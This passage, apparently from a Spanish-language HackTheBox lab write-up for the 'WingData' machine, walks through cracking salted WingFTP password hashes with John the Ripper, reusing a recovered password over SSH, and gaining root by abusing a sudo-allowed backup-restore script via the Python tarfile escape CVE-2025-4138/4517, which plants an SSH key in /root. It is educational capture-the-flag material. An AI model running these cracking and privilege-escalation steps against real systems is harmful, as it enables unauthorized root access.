+</span></span><span style="display:flex;"><span>Data/1/users/john.xml:        &lt;Password&gt;c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10&lt;/Password&gt;</span></span></code></pre></div></div>
+<p>WingFTP usa SHA256, la intentamos crackear con <code>jtr</code> y desde CrackStation, pero no da resultados:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ john hashes --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>Raw-SHA256 
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">6</span> password hashes with no different salts <span style="color:#f92672">(</span>Raw-SHA256 <span style="color:#f92672">[</span>SHA256 512/512 AVX512BW 16x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Warning: poor OpenMP scalability <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">8</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>0g 0:00:00:00 DONE <span style="color:#f92672">(</span>2026-02-15 14:18<span style="color:#f92672">)</span> 0g/s 35858Kp/s 35858Kc/s 71716KC/s 02122271335..*7¡Vamos!
+</span></span><span style="display:flex;"><span>Session completed.</span></span></code></pre></div></div>
+<blockquote><p>Pasadas unas horas, se me ocurre que (dado que no había avanzado nada más) posiblemente no hubiésemos podido crackear las contraseñas porque había un salt a la hora de hashear que no habíamos visto (y que quizás aplicaba para todas las contraseñas por igual, por eso no salía explícitamente en el hash de cada usuario).</p>
+</blockquote><p>Buscando en los archivos, encuentro lo siguiente:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wingftp@wingdata:/opt/wftpserver/Data/1$ grep <span style="color:#e6db74">&#34;Salting&#34;</span> settings.xml 
+</span></span><span style="display:flex;"><span>    &lt;EnablePasswordSalting&gt;1&lt;/EnablePasswordSalting&gt;
+</span></span><span style="display:flex;"><span>    &lt;SaltingString&gt;WingFTP&lt;/SaltingString&gt;</span></span></code></pre></div></div>
+<p>Tenemos el salt <code>WingFTP</code>, tenemos los hashes, posiblemente ahora podamos crackearlos, aunque necesitamos saber cómo se aplica el salt al hashear. Hay varios formatos válidos en jtr, lo normal es que sea <code>salt,hash</code> o <code>hash,salt</code>. Como, para probar, jtr necesita que le demos hash y salt en el formato <code>HASH$SALT</code>, creamos el archivo:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sed -i <span style="color:#e6db74">&#39;s/$/$WingFTP/&#39;</span> hashes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ cat hashes
+</span></span><span style="display:flex;"><span>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba$WingFTP
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ john hashes --format<span style="color:#f92672">=</span>dynamic_62 --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">6</span> password hashes with no different salts <span style="color:#f92672">(</span>dynamic_62 <span style="color:#f92672">[</span>sha256<span style="color:#f92672">(</span>$p.$s<span style="color:#f92672">)</span> 512/512 AVX512BW 16x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>!#7Blushing^*Bride5 <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>2g 0:00:00:00 DONE <span style="color:#f92672">(</span>2026-02-15 15:52<span style="color:#f92672">)</span> 2.325g/s 16678Kp/s 16678Kc/s 83401KC/s !JD021803..*7¡Vamos!
+</span></span><span style="display:flex;"><span>Session completed.</span></span></code></pre></div></div>
+<p>Y tenemos la contraseña <code>!#7Blushing^*Bride5</code>, que corresponde al hash <code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</code>, del usuario <code>wacky</code>.</p>
+<p>Dado que, como hemos visto al enumerar, este usuario es el que también existe como usuario del SO, probamos a conectarnos por SSH por si se reutilizan contraseñas.</p>
+
+<h3 class="relative group">Conexión por SSH, Wacky
+    <div id="conexión-por-ssh-wacky" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conexi%c3%b3n-por-ssh-wacky" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh wacky@ftp.wingdata.htb
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;ftp.wingdata.htb (10.129.5.169)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is: SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>ftp.wingdata.htb<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">wacky@ftp.wingdata.htb&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wacky@wingdata:~$ </span></span></code></pre></div></div>
+<p>Como wacky, ejecutamos <code>sudo -l</code> y vemos lo siguiente:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wacky@wingdata:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> wacky on wingdata:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User wacky may run the following commands on wingdata:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span></span></code></pre></div></div>
+<p>Al mirar el archivo <code>.py</code>,  vemos que se trata de un programa que permite restaurar configuraciones de clientes desde un archivo <code>.tar</code> validado.</p>
+
+<h4 class="relative group">Script <code>restore_cackup_clients.py</code>
+    <div id="script-restore_cackup_clientspy" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#script-restore_cackup_clientspy" aria-label="Ancla">#</a>
+    </span>
+    
+</h4>
+<p>Vemos que el script hace lo siguiente:</p>
+<ol>
+<li>Primero establece una serie de rutas</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>BACKUP_BASE_DIR <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/backup_clients/backups&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># directorio donde deben existir los backups.</span>
+</span></span><span style="display:flex;"><span>STAGING_BASE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/backup_clients/restored_backups&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># directorio base donde se restaurarán los archivos.</span></span></span></code></pre></div></div>
+<ol start="2">
+<li>Define dos argumentos obligatorios</li>
+</ol>
+<ul>
+<li><code>-b</code> / <code>--backup</code>: Nombre del archivo backup</li>
+<li><code>-r</code> / <code>--restore</code>: Nombre del directorio donde se restaurará el contenido</li>
+</ul>
+<ol start="3">
+<li>Valida nombre del backup, formar ruta absoluta del backup y verificar que existe</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> validate_backup_name(args<span style="color:#f92672">.</span>backup):
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El nombre debe tener el siguiente formato: &#34;backup_&lt;Integer&gt;.tar&#34;, con &lt;Integer&gt; != 0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ruta absoluta</span>
+</span></span><span style="display:flex;"><span>backup_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(BACKUP_BASE_DIR, args<span style="color:#f92672">.</span>backup)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ver si existe</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(backup_path): <span style="color:#f92672">...</span></span></span></code></pre></div></div>
+<ol start="4">
+<li>Valida restore_dir</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> validate_restore_tag(tag):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&#34;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># restore_dir debe tener el siguiente formato: &#34;restore_&lt;tag&gt;&#34;, con &lt;tag&gt; siendo de 1-24 caracteres y solo con letras, dígitos y guiones bajos (_).</span></span></span></code></pre></div></div>
+<ol start="5">
+<li>Crea directorio de staging (si no existe todavía)</li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>staging_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(STAGING_BASE, args<span style="color:#f92672">.</span>restore_dir)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># P.ej: /opt/backup_clients/restored_backups/restore_wacky7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Crear directorio, si existe da igual (no da error).</span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>makedirs(staging_dir, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)</span></span></code></pre></div></div>
+<ol start="6">
+<li>Extrae el archivo <code>.tar</code></li>
+</ol>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> tarfile<span style="color:#f92672">.</span>open(backup_path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> tar:
+</span></span><span style="display:flex;"><span>    tar<span style="color:#f92672">.</span>extractall(path<span style="color:#f92672">=</span>staging_dir, filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span></span></span></code></pre></div></div>
+<p>En resumen:</p>
+<ul>
+<li>Tienes un archivo en <code>/opt/backup_clients/backups/</code>, p.ej <code>backup_1234.tar</code>, con configuraciones previamente guardadas.</li>
+<li>El archivo <code>.tar</code> se extrae en la carpeta de Staging: <code>/opt/backup_clients/restored_backups/&lt;restore_dir&gt;</code>, p.ej <code>restore_wacky/</code></li>
+</ul>
+<p>Si miramos el programa, vemos que podríamos usar <code>/opt/backup_clients/restored_backups/</code> y crear un enlace simbólico ahí que apuntase a, p.ej, <code>/root/.ssh/</code>, para luego crear un tarball con nuestra clave pública ssh y hacer que el programa lo extrayese. El único inconveniente con esto es que no tenemos permisos de escritura en <code>/opt/backup_clients/restored_backups/</code>.</p>
+<p>Como no podemos hacer mucho, miramos si el problema está en python más que en el script en sí:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wacky@wingdata:/opt/backup_clients/restored_backups$ python3 --version
+</span></span><span style="display:flex;"><span>Python 3.12.3</span></span></code></pre></div></div>
+<p>Si hacemos una búsqueda rápida:</p>
+<blockquote><p><em>Python 3.12.3 contains multiple vulnerabilities in the tarfile module that allow attackers to modify files or permissions outside the extraction directory, which can lead to privilege escalation.</em></p>
+</blockquote><p>Las principales: <a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-12718"  target="_blank" rel="noreferrer"><code>CVE-2024-12718</code></a>, <a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2025-4517"  target="_blank" rel="noreferrer"><code>CVE-2025-4517</code></a>, <a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2025-4138"  target="_blank" rel="noreferrer"><code>CVE-2025-4138</code></a></p>
+<ul>
+<li><code>CVE-2024-12718</code>: Si el módulo <code>tar</code> usa <code>filter='tar'</code>, podemos cambiar permisos de archivos, en este caso se usa <code>'data'</code> así que lo descartamos.</li>
+<li><code>CVE-2025-4517</code> y <code>CVE-2025-4138</code> usan prácticamente la misma técnica de explotación,</li>
+</ul>
+
+<h4 class="relative group">CVE-2025-4138 / CVE-2025-4517
+    <div id="cve-2025-4138--cve-2025-4517" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cve-2025-4138--cve-2025-4517" aria-label="Ancla">#</a>
+    </span>
+    
+</h4>
+<blockquote><p>Tenemos disponible un <a href="https://github.com/DesertDemons/CVE-2025-4138-4517-POC"  target="_blank" rel="noreferrer">PoC público</a> que explica las vulnerabilidades, podemos basarnos en él para construir uno que haga lo mismo:</p>
+</blockquote><p>La explotación consiste en lo siguiente:
+En un python completamente vulnerable, si estuviésemos limitados a un directorio específico y no pudiésemos subir arriba de forma relativa (..) o absoluta (/), sería posible crear un <code>.tar</code> con un symlink que, p.ej, apuntase a <code>/</code>, para que luego todo lo que se descomprimiese del <code>.tar</code>, se crease en una ruta a partir del symlink, es decir, a partir de <code>/</code> (p.ej, copiar nuestra clave pública a <code>/root/authorized_keys</code>).</p>
+<p>El problema que tiene esto es que en nuestro script, el filtro <code>data</code> en:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>tar<span style="color:#f92672">.</span>extractall(path<span style="color:#f92672">=</span>staging_dir, filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data&#34;</span>)</span></span></code></pre></div></div>
+<p>vería, tras resolver nuestro symlink malicioso, que la ruta real es <code>/</code> (o <code>..</code> si lo usásemos) y nos indicaría que no está permitido realizar esa operación porque está fuera de nuestros límites.</p>
+<p>Esto lo podemos aprovechar usando un problema que tiene Python en esta versión:</p>
+<ul>
+<li>El SO tiene un límite llamado <code>PATH_MAX</code> (Normalmente, según el PoC, de 4096 bytes), cuando Python intenta averiguar a dónde va un archivo realmente, usa <code>os.path.realpath()</code>, que resuelve los enlaces.</li>
+<li>Si creamos un string que, al resolverse, supera los 4096B, <code>os.path.realpath()</code> deja de resolver al saturarse.</li>
+<li>El filtro <code>data</code> mira la ruta &ldquo;a medio resolver&rdquo;, como no ha terminado aún, no apunta a <code>/</code> y no hay problema, se la pasa al kernel para que escriba el archivo.</li>
+<li>El kernel tiene límites más amplios, cuando recoge la ruta, resuelve la ruta completa, y el archivo escapa.</li>
+</ul>
+<p>Con el objetivo de copiar nuestra clave pública a <code>/root/.ssh/authorized_keys</code>, primero creamos el par de claves:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh-keygen -t rsa                         
+</span></span><span style="display:flex;"><span>Generating public/private rsa key pair.
+</span></span><span style="display:flex;"><span>Enter file in which to save the key <span style="color:#f92672">(</span>/home/kali/.ssh/id_rsa<span style="color:#f92672">)</span>: ./wingdataKey
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;./wingdataKey&#34;</span> <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>: 
+</span></span><span style="display:flex;"><span>Enter same passphrase again: 
+</span></span><span style="display:flex;"><span>Your identification has been saved in ./wingdataKey
+</span></span><span style="display:flex;"><span>Your public key has been saved in ./wingdataKey.pub
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ cat wingdataKey.pub
+</span></span><span style="display:flex;"><span>ssh-rsa AAA...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...q/0V9E<span style="color:#f92672">=</span> kali@kali</span></span></code></pre></div></div>
+<p>Ahora tomamos un PoC encargado de hacer esto y lo ejecutamos</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit_gen.py --preset ssh-key --payload ./wingdataKey.pub --tar-out backup_999.tar
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit tar: backup_999.tar
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Target: /root/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Payload size: <span style="color:#ae81ff">563</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ cp backup_999.tar /opt/backup_clients/backups/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_999.tar -r restore_test
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Backup: backup_999.tar
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Staging directory: /opt/backup_clients/restored_backups/restore_test
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extraction completed in /opt/backup_clients/restored_backups/restore_test</span></span></code></pre></div></div>
+<p>Desde nuestra máquina:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh -i wingdataKey root@wingdata.htb
+</span></span><span style="display:flex;"><span>Linux wingdata 6.1.0-42-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Mon Feb <span style="color:#ae81ff">16</span> 11:17:46 <span style="color:#ae81ff">2026</span> from 10.10.15.141
+</span></span><span style="display:flex;"><span>root@wingdata:~# </span></span></code></pre></div></div>
+<p>Y somos root.</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/writeups/wingdata/&amp;title=HackTheBox%20-%20Wingdata"
+          
+          title="Compartir en LinkedIn"
+          aria-label="Compartir en LinkedIn">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://twitter.com/intent/tweet/?url=http://localhost:1313/writeups/wingdata/&amp;text=HackTheBox%20-%20Wingdata"
+          
+          title="Tuitear en Twitter"
+          aria-label="Tuitear en Twitter">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://reddit.com/submit/?url=http://localhost:1313/writeups/wingdata/&amp;resubmit=true&amp;title=HackTheBox%20-%20Wingdata"
+          
+          title="Publicar en Reddit"
+          aria-label="Publicar en Reddit">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/writeups/wingdata/&amp;quote=HackTheBox%20-%20Wingdata"
+          
+          title="Compartir en Facebook"
+          aria-label="Compartir en Facebook">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://api.whatsapp.com/send?text=http://localhost:1313/writeups/wingdata/&amp;resubmit=true&amp;title=HackTheBox%20-%20Wingdata"
+          
+          title=""
+          aria-label="">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+</span>
+        </a>
+      
+    
+  </section>
+
+
+        
+  
+  
